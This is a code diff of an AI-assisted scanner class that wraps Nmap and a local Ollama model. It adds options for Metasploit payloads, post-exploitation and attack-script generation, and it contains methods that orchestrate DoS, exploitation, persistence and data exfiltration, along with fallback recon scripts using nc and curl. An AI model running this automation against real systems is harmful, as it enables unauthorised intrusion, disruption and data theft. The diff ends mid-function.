@@ -1057,12 +1057,38 @@ class AdaptiveNmapScanner:
         dos_method=None,
         dos_threads=10,
         dos_duration=60,
-        dos_payload=None
+        dos_payload=None,
+        # New parameters from use_cases.md
+        ports="quick",
+        services=False,
+        version_detection=False,
+        os_detection=False,
+        vulnerability_scan=False,
+        model_timeout=30,
+        max_threads=4,
+        memory_limit=None,
+        msf_options=None,
+        msf_payload=None,
+        msf_module=None,
+        post_exploitation=False,
+        log_file=None,
+        verbose=False,
+        custom_vuln_file=None,
+        output_file=None,
+        output_format="text",
+        generate_script=False,
+        generate_script_name=None,
+        script_generation_type=None,
+        iterations=None,
+        model=None
     ):
         """Initialize the scanner with the given parameters."""
         self.target = target
-        self.ollama_model = ollama_model
-        self.max_iterations = max_iterations
+        # Use model if provided, otherwise use ollama_model
+        self.ollama_model = model if model is not None else ollama_model
+        # Use iterations if provided, otherwise use max_iterations
+        self.max_iterations = iterations if iterations is not None else max_iterations
+        self.iterations = self.max_iterations  # Alias for parameter consistency
         self.continuous = continuous
         self.delay = delay
         self.msf_integration = msf_integration
@@ -1096,6 +1122,28 @@ class AdaptiveNmapScanner:
         self.dos_threads = dos_threads
         self.dos_duration = dos_duration
         self.dos_payload = dos_payload
+        
+        # New parameters
+        self.ports = ports
+        self.services = services
+        self.version_detection = version_detection
+        self.os_detection = os_detection
+        self.vulnerability_scan = vulnerability_scan
+        self.model_timeout = model_timeout
+        self.max_threads = max_threads
+        self.memory_limit = memory_limit
+        self.msf_options = msf_options
+        self.msf_payload = msf_payload
+        self.msf_module = msf_module
+        self.post_exploitation = post_exploitation
+        self.log_file = log_file
+        self.verbose = verbose
+        self.custom_vuln_file = custom_vuln_file
+        self.output_file = output_file
+        self.output_format = output_format
+        self.generate_script = generate_script
+        self.generate_script_name = generate_script_name
+        self.script_generation_type = script_generation_type
         
         # If red team mode is enabled, enable all related features
         if self.red_team:
@@ -2503,1363 +2551,1095 @@ if __name__ == "__main__":
             return False
 
     def run(self):
-        """Main execution method."""
-        try:
-            # Display start banner using the viewer
-            self.viewer.display_start_banner(
-                self.target, 
-                "DoS Attack" if self.dos_attack else "Standard Scan", 
-                self.ollama_model
-            )
-            
-            # Ensure Ollama model is available
-            logger.info(f"Using existing model: {self.ollama_model}")
-            self._ensure_model_available()
-            
-            # Initialize network discovery if needed
-            if self.auto_discover:
-                logger.info("Starting network discovery...")
-                self._discover_network()
-            
-            # Setup Metasploit if requested
-            if self.msf_integration:
-                logger.info("Setting up Metasploit integration...")
-                self.setup_metasploit()
-            
-            # Main scan loop
-            iteration = 1
-            while iteration <= self.max_iterations:
-                logger.info(f"Starting scan iteration {iteration}/{self.max_iterations}")
-                
-                # Generate scan parameters
-                scan_params = self.generate_scan_parameters(iteration)
-                logger.info(f"Using scan parameters: {scan_params}")
-                
-                # Run the scan
-                logger.info(f"Running Nmap scan on target: {self.target}")
-                result = self.run_nmap_scan(scan_params)
-                
-                # Process results
-                if result:
-                    logger.info("Processing scan results...")
-                    self.summarize_results(result)
-                    
-                    # Handle DoS attack if requested
-                    if self.dos_attack:
-                        logger.info("Initiating DoS attack...")
-                        success = self.perform_dos_attack(self.target)
-                        logger.info(f"DoS attack {'successful' if success else 'failed'}")
-                    
-                    # Handle exploitation if requested
-                    if self.exploit:
-                        logger.info("Attempting exploitation...")
-                        self.run_exploits_on_host(self.target)
-                    
-                    # Generate custom scripts if requested
-                    if self.custom_scripts:
-                        logger.info("Generating custom scripts...")
-                        script_type = self.determine_best_script_type()
-                        self.generate_custom_script(script_type)
-                
-                # Check if we should continue
-                if not self.continuous:
-                    break
-                
-                # Wait before next iteration
-                if iteration < self.max_iterations:
-                    logger.info(f"Waiting {self.delay} seconds before next iteration...")
-                    time.sleep(self.delay)
-                
-                iteration += 1
-            
-            logger.info("Scan completed successfully")
-            
-        except KeyboardInterrupt:
-            logger.info("Scan interrupted by user")
-        except Exception as e:
-            logger.error(f"Error during scan: {e}")
-            if self.debug:
-                traceback.print_exc()
-            raise
-    
-    def determine_best_script_type(self):
-        """Determine the best script type based on scan results."""
-        # Default to bash
-        script_type = "bash"
+        """
+        Main method to execute the full scanning workflow
+        """
+        logging.info("Starting Adaptive Nmap Scanner")
+        scan_targets = []
         
-        try:
-            # Get open ports from scan history
-            open_ports = self.get_open_ports_from_history()
+        # Determine targets
+        if self.auto_discover:
+            logging.info("Auto-discovering hosts on the network")
+            discovered_hosts = self.discover_hosts()
             
-            # Check if specific services are running
-            has_web_server = False
-            has_windows_services = False
-            
-            for entry in self.scan_history:
-                result = entry.get('result', {})
-                if 'scan' in result and self.target in result['scan']:
-                    target_info = result['scan'][self.target]
-                    
-                    # Check for web services
-                    for proto in ['tcp', 'udp']:
-                        if proto in target_info:
-                            for port, port_data in target_info[proto].items():
-                                service = port_data.get('name', '').lower()
-                                
-                                if service in ['http', 'https']:
-                                    has_web_server = True
-                                elif service in ['msrpc', 'microsoft-ds', 'netbios-ssn']:
-                                    has_windows_services = True
-            
-            # Choose script type based on services
-            if has_web_server:
-                script_type = "python"  # Python is good for web services
-            elif has_windows_services:
-                script_type = "powershell"  # PowerShell for Windows targets
+            if not discovered_hosts:
+                logging.warning("No hosts discovered")
+                return
                 
-            self.logger.info(f"Determined best script type: {script_type}")
-            return script_type
-            
-        except Exception as e:
-            self.logger.error(f"Error determining best script type: {e}")
-            return script_type
-    
-    def generate_scan_parameters(self, iteration):
-        """Generate Nmap scan parameters based on iteration number."""
-        if iteration == 1:
-            # First iteration: Quick scan to identify open ports
-            self.logger.info("First iteration: Quick scan to identify open ports")
-            if self.stealth:
-                # Stealthier scan with timing template 2
-                parameters = [
-                    "-sS",  # SYN scan
-                    "-T2",  # Timing template 2 (slower but stealthier)
-                    "-F",   # Fast scan (top 100 ports)
-                    "-sV",  # Version detection
-                    "--version-intensity", "2",  # Version detection intensity
-                    "-O",   # OS detection
-                    "--osscan-limit",  # Limit OS detection to promising targets
-                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                    "--script-trace",  # Show script execution details
-                    self.target if self.target else self.discovered_hosts[self.current_target_index]
-                ]
+            if self.scan_all:
+                scan_targets = discovered_hosts
+                logging.info(f"Scanning all {len(discovered_hosts)} discovered hosts")
             else:
-                # Normal quick scan
-                parameters = [
-                    "-sS",  # SYN scan
-                    "-T4",  # Timing template 4 (normal speed)
-                    "-F",   # Fast scan (top 100 ports)
-                    "-sV",  # Version detection
-                    "--version-intensity", "2",  # Version detection intensity
-                    "-O",   # OS detection
-                    "--osscan-limit",  # Limit OS detection to promising targets
-                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                    "--script-trace",  # Show script execution details
-                    self.target if self.target else self.discovered_hosts[self.current_target_index]
-                ]
-        elif iteration == 2:
-            # Second iteration: Detailed scan of ports found in first scan
-            self.logger.info("Second iteration: Detailed scan of ports found in first scan")
-            ports = self.get_open_ports_from_history()
-            if ports:
-                # Scan specific ports found in previous iterations
-                port_list = ",".join(map(str, ports))
-                parameters = [
-                    "-sS",  # SYN scan
-                    "-T4",  # Timing template 4
-                    "-p", port_list,  # Specific ports
-                    "-sV",  # Version detection
-                    "-O",   # OS detection
-                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                    "--script-trace",  # Show script execution details
-                    self.target if self.target else self.discovered_hosts[self.current_target_index]
-                ]
-            else:
-                # Fall back to scanning top 1000 ports
-                parameters = [
-                    "-sS",  # SYN scan
-                    "-T4",  # Timing template 4
-                    "-p", "1-1000",  # Top 1000 ports
-                    "-sV",  # Version detection
-                    "-O",   # OS detection
-                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                    "--script-trace",  # Show script execution details
-                    self.target if self.target else self.discovered_hosts[self.current_target_index]
-                ]
+                # Pick the most interesting hosts based on some criteria
+                scan_targets = self.select_targets(discovered_hosts)
+                logging.info(f"Selected {len(scan_targets)} hosts for scanning")
+        elif self.target:
+            # Use the specified target
+            scan_targets = [self.target]
+            logging.info(f"Using provided target: {self.target}")
         else:
-            # Advanced iterations: Generate based on AI suggestions or use comprehensive scan
-            if self.scan_history and len(self.scan_history) >= 2:
-                # Use AI to suggest parameters based on scan history
-                self.logger.info("Advanced iteration: AI-suggested scan parameters")
-                
-                # Generate prompt for Ollama
-                prompt = self.construct_prompt(iteration)
-                
-                # Call Ollama to get suggested scan parameters
-                if self.show_live_ai:
-                    response = self.call_ollama(prompt, stream=True)
-                else:
-                    # Start a simple animation for better UX
-                    animation = SingleLineAnimation("Generating adaptive scan parameters...")
-                    response = self.call_ollama(prompt)
-                    animation.set()
-                    
-                # Parse response to get suggested parameters
-                suggested_params = self.parse_ollama_response(response)
-                
-                # If we got valid parameters, use them
-                if suggested_params and isinstance(suggested_params, list) and len(suggested_params) > 2:
-                    # Make target the first parameter
-                    if self.target:
-                        suggested_params.insert(0, self.target)
-                    elif self.discovered_hosts:
-                        suggested_params.insert(0, self.discovered_hosts[self.current_target_index])
-                        
-                    # Sanitize parameters (no -oX)
-                    parameters = []
-                    i = 0
-                    while i < len(suggested_params):
-                        if suggested_params[i] == "-oX" and i < len(suggested_params) - 1 and suggested_params[i+1] == "-":
-                            # Skip both "-oX" and "-" parameters
-                            i += 2
-                        else:
-                            parameters.append(suggested_params[i])
-                            i += 1
-                        
-                    # Add script error handling parameters
-                    if "--script" in parameters:
-                        parameters.extend([
-                            "--script-args", "http-security-headers.output=all",
-                            "--script-trace"
-                        ])
-                        
-                    self.logger.info(f"AI-suggested scan parameters: {' '.join(parameters)}")
-                else:
-                    # Fallback to comprehensive scan
-                    self.logger.info("Advanced iteration: Comprehensive scan (AI fallback)")
-                    parameters = [
-                        "-sS",  # SYN scan
-                        "-T4",  # Timing template 4
-                        "-p", "1-10000",  # Full port scan
-                        "-sV",  # Version detection
-                        "--version-intensity", "4",  # Maximum version detection intensity
-                        "-O",   # OS detection
-                        "--osscan-guess",  # Guess OS even if not 100% sure
-                        "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                        "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                        "--script-trace",  # Show script execution details
-                        self.target if self.target else self.discovered_hosts[self.current_target_index]
-                    ]
-            else:
-                # Not enough history for AI, use comprehensive scan
-                self.logger.info("Advanced iteration: Comprehensive scan")
-                parameters = [
-                    "-sS",  # SYN scan
-                    "-T4",  # Timing template 4
-                    "-p", "1-10000",  # Full port scan
-                    "-sV",  # Version detection
-                    "--version-intensity", "4",  # Maximum version detection intensity
-                    "-O",   # OS detection
-                    "--osscan-guess",  # Guess OS even if not 100% sure
-                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
-                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
-                    "--script-trace",  # Show script execution details
-                    self.target if self.target else self.discovered_hosts[self.current_target_index]
-                ]
+            logging.error("No targets specified and auto-discovery is disabled")
+            return
+            
+        # Run the scans in iterations
+        scan_results = []
+        vuln_results = []
         
-        # Apply stealth mode if enabled (for iterations after the first)
-        if self.stealth and iteration > 1:
-            # Replace timing template with more stealthy one
-            for i, param in enumerate(parameters):
-                if param == "-T4":
-                    parameters[i] = "-T2"
+        if self.continuous:
+            logging.info("Running in continuous mode until stopped")
+            iteration = 0
+            
+            try:
+                while True:
+                    iteration += 1
+                    logging.info(f"Starting scan iteration {iteration}")
                     
-            # Add randomized timing options for additional stealth
-            parameters.extend(["--randomize-hosts", "--max-retries", "2"])
+                    result = self.execute_nmap_scan(scan_targets)
+                    scan_results.append(result)
+                    
+                    if self.vulnerability_scan:
+                        vuln_result = self.run_vulnerability_scan(result.get('hosts', []))
+                        vuln_results.append(vuln_result)
+                        
+                    # Save results if an output file is specified
+                    if self.output_file:
+                        self.save_results(scan_results, vuln_results)
+                        
+                    logging.info(f"Completed scan iteration {iteration}")
+                    
+                    # Delay before next iteration
+                    time.sleep(self.delay)
+            except KeyboardInterrupt:
+                logging.info("Continuous scanning stopped by user")
+        else:
+            # Run for a fixed number of iterations
+            for i in range(self.iterations):
+                logging.info(f"Starting scan iteration {i+1}/{self.iterations}")
+                
+                result = self.execute_nmap_scan(scan_targets)
+                scan_results.append(result)
+                
+                if self.vulnerability_scan:
+                    vuln_result = self.run_vulnerability_scan(result.get('hosts', []))
+                    vuln_results.append(vuln_result)
+                    
+                # Delay before next iteration, but not after the last one
+                if i < self.iterations - 1:
+                    time.sleep(self.delay)
+        
+        # Save final results if an output file is specified
+        if self.output_file:
+            self.save_results(scan_results, vuln_results)
             
-        return parameters
-    
-    def run_nmap_scan(self, target):
-        """Run Nmap scan with optimized parameters."""
+        # Generate attack script if requested
+        if self.generate_script:
+            script_path = self.generate_attack_script(scan_results, vuln_results)
+            if script_path:
+                logging.info(f"Attack script generated: {script_path}")
+                
+        logging.info("Adaptive Nmap Scanner completed successfully")
+        
+    def discover_hosts(self):
+        """
+        Discover hosts on the network
+        """
+        logging.info("Discovering hosts on the network")
+        hosts = []
+        
+        # Determine target network
+        if self.network:
+            target = self.network
+        else:
+            # Auto-detect network based on interface
+            interface = self.interface
+            if not interface:
+                # Try to find default interface
+                try:
+                    import netifaces
+                    gateways = netifaces.gateways()
+                    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
+                        interface = gateways['default'][netifaces.AF_INET][1]
+                except (ImportError, KeyError):
+                    logging.error("Failed to determine default interface, please specify --interface")
+                    return []
+                    
+            try:
+                import netifaces
+                addrs = netifaces.ifaddresses(interface)
+                if netifaces.AF_INET in addrs:
+                    ip = addrs[netifaces.AF_INET][0]['addr']
+                    netmask = addrs[netifaces.AF_INET][0]['netmask']
+                    
+                    # Calculate network in CIDR notation
+                    import ipaddress
+                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
+                    target = str(network)
+                else:
+                    logging.error("No IPv4 address assigned to interface")
+                    return []
+            except (ImportError, ValueError, KeyError) as e:
+                logging.error(f"Failed to calculate network: {str(e)}")
+                return []
+                
+        logging.info(f"Discovering hosts on network: {target}")
+        
+        # Run ping sweep with Nmap to discover hosts
+        nmap_cmd = ["nmap", "-sn", target, "-oX", "-"]
+        
         try:
-            self.logger.info(f"Starting Nmap scan against {target}")
-            
-            # Construct Nmap command with optimized parameters
-            command = [
-                "nmap",
-                "-sS",  # SYN scan
-                "-sV",  # Version detection
-                "-O",   # OS detection
-                "--version-intensity", "5",  # Maximum version detection intensity
-                "--max-retries", "2",  # Reduce retries for faster scanning
-                "--max-scan-delay", "5s",  # Maximum delay between probes
-                "--min-parallelism", "10",  # Minimum parallel probes
-                "--max-parallelism", "100",  # Maximum parallel probes
-                "--min-hostgroup", "10",  # Minimum hosts to scan in parallel
-                "--max-hostgroup", "100",  # Maximum hosts to scan in parallel
-                "--min-rtt-timeout", "100ms",  # Minimum RTT timeout
-                "--max-rtt-timeout", "1000ms",  # Maximum RTT timeout
-                "--initial-rtt-timeout", "500ms",  # Initial RTT timeout
-                "--max-retries", "2",  # Maximum number of retries
-                "--host-timeout", "30s",  # Maximum time to wait for a host
-                "--scan-delay", "1ms",  # Minimum time between probes
-                "--max-scan-delay", "10s",  # Maximum time between probes
-                "--min-rate", "100",  # Minimum packets per second
-                "--max-rate", "1000",  # Maximum packets per second
-                "-p-",  # Scan all ports
-                "--open",  # Only show open ports
-                "-T4",  # Aggressive timing template
-                "-n",   # No DNS resolution
-                "--append-output",  # Append to output file
-                "-oX", f"{self.output_file}",  # XML output
-                target
-            ]
-            
-            # Run Nmap with output filtering
             process = subprocess.Popen(
-                command,
+                nmap_cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True,
-                errors='replace'
+                text=True
             )
             
-            # Read output in real-time
-            while True:
-                output = process.stdout.readline()
-                if output == '' and process.poll() is not None:
-                    break
-                if output:
-                    # Filter and process output
-                    if not any(debug in output.lower() for debug in ['debug:', 'debugging:', 'debugger:']):
-                        self.logger.debug(output.strip())
+            if not self.quiet:
+                self.animate_loading(f"Discovering hosts on {target}", process)
+                
+            stdout, stderr = process.communicate()
             
-            # Get return code
-            return_code = process.poll()
-            
-            if return_code == 0:
-                self.logger.info(f"Nmap scan completed successfully for {target}")
-                return True
-            else:
-                error_output = process.stderr.read()
-                self.logger.error(f"Nmap scan failed for {target}: {error_output}")
-                return False
+            if process.returncode != 0:
+                logging.error(f"Host discovery failed: {stderr}")
+                return []
+                
+            # Parse the XML output
+            import xml.etree.ElementTree as ET
+            try:
+                tree = ET.fromstring(stdout)
+                for host in tree.findall('.//host'):
+                    status = host.find('status')
+                    if status is not None and status.get('state') == 'up':
+                        # Get the host's IP address
+                        for addr in host.findall('address'):
+                            if addr.get('addrtype') == 'ipv4':
+                                hosts.append(addr.get('addr'))
+                                break
+            except Exception as e:
+                logging.error(f"Failed to parse host discovery results: {str(e)}")
+                traceback.print_exc()
                 
         except Exception as e:
-            self.logger.error(f"Error during Nmap scan: {e}")
-            return False
-    
-    def summarize_results(self, result):
-        """Summarize scan results in a readable format."""
-        if not result or 'scan' not in result:
-            self.logger.warning("No results to summarize")
-            return
-
-        target = self.target if self.target else self.discovered_hosts[self.current_target_index]
-        
-        if target not in result['scan']:
-            self.logger.warning(f"Target {target} not found in scan results")
-            self.viewer.warning(f"No results found for target {target}")
-            return
-        
-        # Extract information from scan result
-        target_info = result['scan'][target]
-        
-        # Count open ports
-        tcp_count = len(target_info.get('tcp', {}))
-        udp_count = len(target_info.get('udp', {}))
-        
-        # Log summary information
-        scan_duration = int(result.get('elapsed', 0))
-        self.logger.info(f"Scan completed in {scan_duration}s: {tcp_count} TCP ports and {udp_count} UDP ports found")
-        
-        # Display scan summary using the viewer
-        self.viewer.scan_summary(target, result)
-    
-    # Ollama integration methods
-    def prepare_ollama_context(self):
-        """Prepare context for Ollama."""
-        context = {
-            'target': self.target,
-            'scan_history': self.scan_history,
-            'open_ports': self.get_open_ports_from_history()
-        }
-        
-        # Additional context from latest scan
-        if self.scan_history:
-            latest_scan = self.scan_history[-1]
-            result = latest_scan.get('result', {})
+            logging.error(f"Error during host discovery: {str(e)}")
+            traceback.print_exc()
             
-            if 'scan' in result and self.target in result['scan']:
-                target_info = result['scan'][self.target]
-                
-                # Extract OS info
-                if 'osmatch' in target_info and target_info['osmatch']:
-                    context['os'] = target_info['osmatch'][0].get('name', 'Unknown')
-                    
-                # Extract hostname
-                if 'hostnames' in target_info and target_info['hostnames']:
-                    context['hostname'] = target_info['hostnames'][0].get('name', 'Unknown')
-                    
-                # Extract service details
-                services = []
-                for proto in ['tcp', 'udp']:
-                    if proto in target_info:
-                        for port, port_data in target_info[proto].items():
-                            if port_data['state'] == 'open':
-                                service = {
-                                    'port': port,
-                                    'proto': proto,
-                                    'name': port_data.get('name', 'unknown'),
-                                    'product': port_data.get('product', ''),
-                                    'version': port_data.get('version', '')
-                                }
-                                services.append(service)
-                                
-                context['services'] = services
+        logging.info(f"Discovered {len(hosts)} hosts")
+        return hosts
         
-        return context
-    
-    def call_ollama(self, prompt, stream=False):
-        """Call Ollama API with the given prompt."""
+    def select_targets(self, hosts, limit=10):
+        """
+        Select a subset of hosts for scanning based on basic heuristics.
+        For now, just pick the first N hosts.
+        """
+        return hosts[:min(limit, len(hosts))]
+        
+    def animate_loading(self, message, process, frames=None):
+        """Display an animated loading indicator while a process is running"""
+        if frames is None:
+            frames = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
+            
+        i = 0
+        while process.poll() is None:
+            frame = frames[i % len(frames)]
+            print(f"\r{message} {frame}", end='', flush=True)
+            time.sleep(0.1)
+            i += 1
+            
+        # Clear the animation line
+        print("\r" + " " * (len(message) + 10) + "\r", end='')
+        
+    def save_results(self, scan_results, vuln_results):
+        """Save scan results to a file"""
+        if not self.output_file:
+            return
+            
+        logging.info(f"Saving results to {self.output_file}")
+        
+        output_format = self.output_format.lower()
+        
         try:
-            # Always stream for script generation
-            if "generate" in prompt.lower() and "script" in prompt.lower():
-                stream = True
-            
-            url = "http://localhost:11434/api/generate"
-            headers = {"Content-Type": "application/json"}
-            data = {
-                "model": self.ollama_model,
-                "prompt": prompt,
-                "stream": stream
+            combined_results = {
+                "scan_results": scan_results,
+                "vulnerability_results": vuln_results,
+                "timestamp": time.time(),
+                "date": time.strftime("%Y-%m-%d %H:%M:%S")
             }
             
-            response = requests.post(url, json=data, headers=headers)
-            response.raise_for_status()
-            
-            if stream:
-                # Create animation for streaming response
-                animation = self.viewer.scanning_animation("Generating script...")
+            if output_format == 'json':
+                import json
+                with open(self.output_file, 'w') as f:
+                    json.dump(combined_results, f, indent=2)
+            elif output_format == 'xml':
+                # Simple XML conversion
+                import xml.dom.minidom
+                import json
                 
-                # Process streaming response
-                full_response = ""
-                for line in response.iter_lines():
-                    if line:
-                        try:
-                            json_response = json.loads(line)
-                            if 'response' in json_response:
-                                chunk = json_response['response']
-                                full_response += chunk
-                                # Always print the chunk for script generation
-                                if "generate" in prompt.lower() and "script" in prompt.lower():
-                                    print(chunk, end='', flush=True)
-                                else:
-                                    self.viewer.status(chunk)
-                        except json.JSONDecodeError:
-                            continue
+                # Convert to JSON first
+                json_str = json.dumps(combined_results)
                 
-                # Stop animation
-                animation.set()
-                return full_response
+                # Create XML structure
+                doc = xml.dom.minidom.Document()
+                root = doc.createElement("adaptive_scan_results")
+                doc.appendChild(root)
+                
+                # Add a CDATA section with the JSON
+                cdata = doc.createCDATASection(json_str)
+                root.appendChild(cdata)
+                
+                # Write to file with pretty printing
+                with open(self.output_file, 'w') as f:
+                    f.write(doc.toprettyxml(indent="  "))
             else:
-                return response.json()['response']
-                
-        except requests.exceptions.RequestException as e:
-            self.logger.error(f"Error calling Ollama API: {e}")
-            return self.generate_fallback_response(prompt)
-    
-    def generate_fallback_response(self, prompt):
-        """Generate a fallback response when Ollama fails."""
-        self.logger.info("Generating fallback response...")
-        
-        # Extract key information from prompt
-        target = self.target
-        open_ports = self.get_open_ports_from_history()
-        
-        # Check if prompt is for script generation
-        if "Generate a " in prompt and "script" in prompt:
-            script_type = "bash"
-            if "python" in prompt.lower():
-                script_type = "python"
-            elif "ruby" in prompt.lower():
-                script_type = "ruby"
-            elif "powershell" in prompt.lower():
-                script_type = "powershell"
-                
-            if script_type == "bash":
-                return f"""```bash
-#!/bin/bash
-# Reconnaissance Script for {target}
-# Generated as fallback when AI is unavailable
-# This script performs basic reconnaissance on the target system
-
-TARGET="{target}"
-OPEN_PORTS=({' '.join(str(port) for port in open_ports)})
-
-echo "Starting reconnaissance on $TARGET"
-echo "Open ports: ${{OPEN_PORTS[@]}}"
-
-# Ping the target
-echo "Checking if host is up..."
-ping -c 3 $TARGET
-
-# Check each open port
-for PORT in "${{OPEN_PORTS[@]}}"; do
-  echo "Checking port $PORT..."
-  
-  case $PORT in
-    21)
-      echo "FTP port detected, checking banner..."
-      echo -e "\\n" | nc -w 5 $TARGET $PORT
-      ;;
-    22)
-      echo "SSH port detected, checking banner..."
-      echo -e "\\n" | nc -w 5 $TARGET $PORT
-      ;;
-    80|443)
-      echo "Web port detected, checking headers..."
-      curl -s -I http://$TARGET:$PORT
-      ;;
-    *)
-      echo "Generic port check..."
-      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
-      ;;
-  esac
-done
-
-echo "Reconnaissance completed"
-```"""
-            elif script_type == "python":
-                return f"""```python
-#!/usr/bin/env python3
-# Reconnaissance Script for {target}
-# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-# This script performs basic reconnaissance on the target system
-
-import socket
-import subprocess
-import sys
-import os
-
-TARGET = "{target}"
-OPEN_PORTS = {open_ports}
-
-def main():
-    print(f"Starting reconnaissance on {{TARGET}}")
-    print(f"Open ports: {{OPEN_PORTS}}")
-    
-    # Ping the target
-    print("Checking if host is up...")
-    try:
-        subprocess.run(["ping", "-c", "3", TARGET], check=True)
-    except subprocess.CalledProcessError:
-        print(f"Host {{TARGET}} appears to be down")
-    
-    # Check each open port
-    for port in OPEN_PORTS:
-        print(f"Checking port {{port}}...")
-        
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(5)
-                result = s.connect_ex((TARGET, port))
-                if result == 0:
-                    print(f"Port {{port}} is open")
-                else:
-                    print(f"Port {{port}} is closed")
-        except Exception as e:
-            print(f"Error checking port {{port}}: {{e}}")
-    
-    print("Reconnaissance completed")
-
-if __name__ == "__main__":
-    main()
-```"""
-        
-        # Default fallback response
-        fallback_response = f"""Based on the reconnaissance of {target}, here are the key findings:
-
-1. Open Ports: {", ".join(str(port) for port in open_ports) if open_ports else "None detected"}
-
-2. Recommended Actions:
-   - Perform a more detailed scan of the open ports
-   - Investigate any running services for vulnerabilities
-   - Document findings for further analysis
-
-This is a basic response generated when the AI model is unavailable."""
-
-        return fallback_response
-    
-    def parse_ollama_response(self, response):
-        """Parse the response from Ollama to extract key information."""
-        try:
-            # For script generation, extract code blocks
-            if "```" in response:
-                code_block_pattern = r"```(?:\w+)?\s*(.+?)```"
-                code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
-                
-                if code_blocks:
-                    return code_blocks[0].strip()
-            
-            # Otherwise, return the full response
-            return response.strip()
-            
-        except Exception as e:
-            self.logger.error(f"Error parsing Ollama response: {e}")
-            return response.strip()
-    
-    def get_open_ports_from_history(self):
-        """Get a list of open ports from the scan history."""
-        open_ports = []
-        
-        for entry in self.scan_history:
-            result = entry.get('result', {})
-            
-            if 'scan' in result and self.target in result['scan']:
-                target_info = result['scan'][self.target]
-                
-                for proto in ['tcp', 'udp']:
-                    if proto in target_info:
-                        for port, port_data in target_info[proto].items():
-                            if port_data['state'] == 'open':
-                                try:
-                                    port_num = int(port)
-                                    if port_num not in open_ports:
-                                        open_ports.append(port_num)
-                                except ValueError:
-                                    pass
-        
-        return sorted(open_ports)
-    
-    def construct_prompt(self, iteration):
-        """Construct a prompt for the LLM based on scan results and current iteration."""
-        # Get context from scan history
-        context = self.prepare_ollama_context()
-        
-        # Construct prompt based on iteration and context
-        if iteration == 1:
-            prompt = f"Based on the initial scan of {self.target}, suggest the next steps for reconnaissance."
-        elif iteration == 2:
-            prompt = f"Based on the detailed scan of {self.target}, identify potential vulnerabilities and suggest exploitation strategies."
-        else:
-            prompt = f"Based on comprehensive scanning of {self.target}, provide a security assessment and recommended actions."
-            
-        return prompt
-
-    def establish_persistence(self, target):
-        """Attempt to establish persistent access to the target."""
-        try:
-            self.logger.info(f"Attempting to establish persistence on {target}")
-            
-            # Generate appropriate persistence script
-            if self._is_windows_target(target):
-                script = self._generate_windows_persistence()
-            else:
-                script = self._generate_linux_persistence()
-                
-            if not script:
-                self.logger.error("Failed to generate persistence script")
-                return False
-                
-            # Execute the script
-            if not self._execute_persistence_script(target, script):
-                self.logger.error("Failed to execute persistence script")
-                return False
-                
-            self.logger.info("Successfully established persistence")
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error establishing persistence: {e}")
-            return False
-
-    def exfiltrate_data(self, target):
-        """Attempt to exfiltrate data from the target."""
-        try:
-            self.logger.info(f"Attempting to exfiltrate data from {target}")
-            
-            # Generate appropriate exfiltration script based on method
-            if self.exfil_method == "dns":
-                script = self._generate_dns_exfiltration()
-            elif self.exfil_method == "http":
-                script = self._generate_http_exfiltration()
-            elif self.exfil_method == "icmp":
-                script = self._generate_icmp_exfiltration()
-            elif self.exfil_method == "smb":
-                script = self._generate_smb_exfiltration()
-            elif self.exfil_method == "ftp":
-                script = self._generate_ftp_exfiltration()
-            else:
-                self.logger.error(f"Unsupported exfiltration method: {self.exfil_method}")
-                return False
-                
-            if not script:
-                self.logger.error("Failed to generate exfiltration script")
-                return False
-                
-            # Execute the script
-            if not self._execute_exfiltration_script(target, script):
-                self.logger.error("Failed to execute exfiltration script")
-                return False
-                
-            self.logger.info("Successfully exfiltrated data")
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error exfiltrating data: {e}")
-            return False
-            
-    def perform_red_team_operations(self, target):
-        """Perform full red team operations on the target."""
-        try:
-            self.logger.info(f"Starting red team operations on {target}")
-            
-            # 1. Initial reconnaissance
-            self.logger.info("Performing initial reconnaissance")
-            scan_results = self.run_nmap_scan(target)
-            if not scan_results:
-                self.logger.error("Failed to perform initial reconnaissance")
-                return False
-                
-            # 2. Vulnerability assessment
-            self.logger.info("Performing vulnerability assessment")
-            vulns = self.assess_vulnerabilities(target, scan_results)
-            if not vulns:
-                self.logger.error("Failed to assess vulnerabilities")
-                return False
-                
-            # 3. Exploitation
-            self.logger.info("Attempting exploitation")
-            if not self.exploit_target(target, vulns):
-                self.logger.error("Failed to exploit target")
-                return False
-                
-            # 4. Persistence
-            if self.persistence:
-                self.logger.info("Establishing persistence")
-                if not self.establish_persistence(target):
-                    self.logger.error("Failed to establish persistence")
-                    return False
+                # Default to text format
+                with open(self.output_file, 'w') as f:
+                    f.write("Adaptive Nmap Scanner Results\n")
+                    f.write("============================\n")
+                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                     
-            # 5. Data exfiltration
-            if self.exfil:
-                self.logger.info("Exfiltrating data")
-                if not self.exfiltrate_data(target):
-                    self.logger.error("Failed to exfiltrate data")
-                    return False
-                    
-            self.logger.info("Red team operations completed successfully")
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error during red team operations: {e}")
-            return False
-
-    def _execute_persistence_script(self, target, script):
-        """Execute a persistence script on the target."""
-        try:
-            # Create a temporary file for the script
